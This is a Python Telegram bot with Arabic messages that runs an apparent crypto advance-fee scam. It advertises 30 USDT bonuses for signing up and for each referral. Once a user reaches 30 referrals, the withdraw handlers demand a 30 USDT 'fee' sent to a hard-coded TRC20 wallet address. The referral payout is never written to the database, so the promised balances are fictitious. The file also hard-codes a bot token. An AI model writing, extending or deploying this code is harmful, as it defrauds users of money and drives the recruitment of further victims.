import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import sqlite3
from datetime import datetime

# إعدادات البوت
TOKEN = "8341828902:AAFCpzitrlDQS0KUlpkQbl4SNUY_2uZTm5A"
ADMIN_CHAT_ID = 910021564

# إعداد قاعدة البيانات
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            balance REAL DEFAULT 30.0,
            referral_count INTEGER DEFAULT 0,
            referral_link TEXT,
            invited_by INTEGER,
            registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            referred_id INTEGER,
            referral_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            status TEXT DEFAULT 'pending',
            request_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

# إنشاء رابط إحالة فريد
def generate_referral_link(user_id):
    return f"https://t.me/YourBotName?start=ref{user_id}"

# 🎯 Handlers الأساسية
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # التحقق إذا كان المستخدم موجوداً
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if not user:
        # تسجيل مستخدم جديد
        referral_link = generate_referral_link(user_id)
        
        # التحقق من رابط الإحالة
        if context.args and context.args[0].startswith('ref'):
            try:
                referrer_id = int(context.args[0][3:])
                cursor.execute('SELECT * FROM users WHERE user_id = ?', (referrer_id,))
                referrer = cursor.fetchone()
                
                if referrer:
                    # تحديث إحالات المُحيل
                    cursor.execute('UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?', (referrer_id,))
                    cursor.execute('INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)', (referrer_id, user_id))
                    
                    # إرسال رسالة للمُحيل
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"🎉 مبروك! تم إضافة 30 USDT إلى رصيدك!\nرصيدك الحالي: {referrer[3] + 30} USDT"
                        )
                    except:
                        pass
            except:
                pass
        
        # إضافة المستخدم الجديد
        cursor.execute('''
            INSERT INTO users (user_id, username, first_name, balance, referral_link) 
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, 30.0, referral_link))
        
        conn.commit()
        
        # رسالة ترحيب
        welcome_text = f"""
        🎊 أهلاً وسهلاً بك {first_name}!

        🎁 لقد حصلت على مكافأة ترحيب 30 USDT!

        📊 رصيدك الحالي: 30 USDT

        🔗 رابط الإحالة الخاص بك:
        {referral_link}

        📋 شروط السحب:
        • يجب邀请 30 صديق كحد أدنى
        • رسوم المعاملة: 30 USDT
        """
        
    else:
        # مستخدم موجود
        referral_link = user[5]
        welcome_text = f"""
        🏠 أهلاً بعودتك {first_name}!

        📊 رصيدك الحالي: {user[3]} USDT
        👥 عدد الإحالات: {user[4]}/30

        🔗 رابط الإحالة الخاص بك:
        {referral_link}
        """

    conn.close()
    
    # إنشاء أزرار
    keyboard = [
        [InlineKeyboardButton("🔗 رابط الإحالة", callback_data="referral_link")],
        [InlineKeyboardButton("📊 رصيدي", callback_data="my_balance")],
        [InlineKeyboardButton("👥 إحالاتي", callback_data="my_referrals")],
        [InlineKeyboardButton("💰 سحب الرصيد", callback_data="withdraw")],
        [InlineKeyboardButton("ℹ️ المساعدة", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

# 🎯 معالجة الأزرار
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if query.data == "referral_link":
        text = f"🔗 رابط الإحالة الخاص بك:\n{user[5]}\n\nشارك هذا الرابط مع أصدقائك لتحصل على 30 USDT لكل صديق!"
    
    elif query.data == "my_balance":
        text = f"💰 رصيدك الحالي: {user[3]} USDT\n\n👥 عدد الإحالات المطلوبة للسحب: {30 - user[4]}\n\n📋 الشروط:\n• 30 إحالة كحد أدنى\n• 30 USDT رسوم معاملة"
    
    elif query.data == "my_referrals":
        text = f"👥 إحالاتك:\n\n📊 العدد الحالي: {user[4]}/30\n\n🎯 المطلوب للسحب: {30 - user[4]} إحالة"
    
    elif query.data == "withdraw":
        if user[4] < 30:
            text = f"❌ لا يمكنك السحب الآن!\n\n👥 لديك {user[4]} إحالة من أصل 30 المطلوبة\n\n🎯 تحتاج إلى {30 - user[4]} إحالة إضافية"
        else:
            text = f"""
            ✅ يمكنك الآن سحب رصيدك!

            💰 الرصيد المتاح للسحب: {user[3]} USDT

            💸 لاستكمال عملية السحب، يرجى إيداع 30 USDT كرسوم معاملة إلى العنوان التالي:

            🌐 الشبكة: TRC20
            🏦 العنوان: TD1bLdJzoiZ3Z8ywuVVjEjCPkS3efRhD3G

            📤 بعد الإيداع، أرسل إشعار الإيداع إلى الدعم الفني.
            """
    
    elif query.data == "help":
        text = """
        ℹ️ مركز المساعدة:

        🎁 مكافأة التسجيل: 30 USDT
        👥 مكافأة الإحالة: 30 USDT لكل صديق
        📊 الحد الأدنى للسحب: 30 إحالة
        💸 رسوم المعاملة: 30 USDT

        🔗 شارك رابط الإحالة مع أصدقائك
        💰 احصل على 30 USDT لكل صديق
        🎯 بعد 30 إحالة، يمكنك سحب رصيدك
        """
    
    conn.close()
    
    await query.edit_message_text(text=text, reply_markup=query.message.reply_markup)

# 🎯 أمر الإحالة
async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT referral_link, referral_count FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if user:
        text = f"""
        📊 إحالاتك:

        🔗 رابط الإحالة:
        {user[0]}

        👥 عدد الإحالات: {user[1]}/30
        🎯 المطلوب: {30 - user[1]} إحالة للسحب

        💰 ستحصل على 30 USDT لكل صديق يسجل عبر رابطك!
        """
    else:
        text = "❌ حدث خطأ. يرجى استخدام /start أولاً"
    
    conn.close()
    await update.message.reply_text(text)

# 🎯 أمر الرصيد
async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT balance, referral_count FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if user:
        text = f"""
        💰 رصيدك:

        💵 الرصيد الحالي: {user[0]} USDT
        👥 عدد الإحالات: {user[1]}/30

        📋 شروط السحب:
        • 30 إحالة كحد أدنى
        • 30 USDT رسوم معاملة
        """
    else:
        text = "❌ حدث خطأ. يرجى استخدام /start أولاً"
    
    conn.close()
    await update.message.reply_text(text)

# 🎯 أمر السحب
async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT balance, referral_count FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    if not user:
        await update.message.reply_text("❌ حدث خطأ. يرجى استخدام /start أولاً")
        return
    
    if user[1] < 30:
        text = f"""
        ❌ لا يمكنك السحب الآن!

        👥 لديك {user[1]} إحالة من أصل 30 المطلوبة
        🎯 تحتاج إلى {30 - user[1]} إحالة إضافية

        🔗 شارك رابط الإحالة مع أصدقائك:
        /referral
        """
    else:
        text = f"""
        🎉 تهانينا! يمكنك الآن سحب رصيدك!

        💰 الرصيد المتاح: {user[0]} USDT

        💸 لاستكمال السحب، يرجى إيداع 30 USDT كرسوم معاملة إلى:

        🌐 الشبكة: TRC20
        🏦 العنوان: TD1bLdJzoiZ3Z8ywuVVjEjCPkS3efRhD3G

        📤 بعد الإيداع:
        1. احفظ رقم المعاملة (TXID)
        2. تواصل مع الدعم الفني
        3. أرسل رقم المعاملة ومعلومات محفظتك

        ⏰ معالجة الطلب: 24-48 ساعة
        """
    
    conn.close()
    await update.message.reply_text(text)

# 🎯 الإعدادات الرئيسية
def main():
    # تهيئة قاعدة البيانات
    init_db()
    
    # إنشاء تطبيق البوت
    application = Application.builder().token(TOKEN).build()
    
    # إضافة Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("referral", referral_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("withdraw", withdraw_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # بدء البوت
    print("🤖 البوت يعمل الآن...")
    application.run_polling()

if __name__ == '__main__':
    main()
